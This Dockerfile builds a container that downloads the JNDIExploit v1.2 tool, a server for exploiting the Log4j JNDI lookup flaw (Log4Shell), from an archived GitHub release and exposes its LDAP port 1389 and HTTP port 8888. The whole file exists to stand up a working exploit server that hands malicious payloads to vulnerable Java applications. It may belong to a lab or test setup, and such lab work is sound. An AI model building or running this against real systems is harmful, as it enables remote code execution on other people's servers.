FROM openjdk:8-jre-alpine
RUN apk update && apk --no-cache add vim procps binutils curl bash wget openssl

WORKDIR /

RUN mkdir -p /jndi-ldap
RUN wget "https://web.archive.org/web/20211211031401if_/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream" -O JNDIExploit.v1.2.zip

RUN unzip -d jndi-ldap JNDIExploit.v1.2.zip

WORKDIR /jndi-ldap

COPY entrypoint.sh .
RUN chmod +x entrypoint.sh

EXPOSE 1389
EXPOSE 8888

ENTRYPOINT ["./entrypoint.sh"]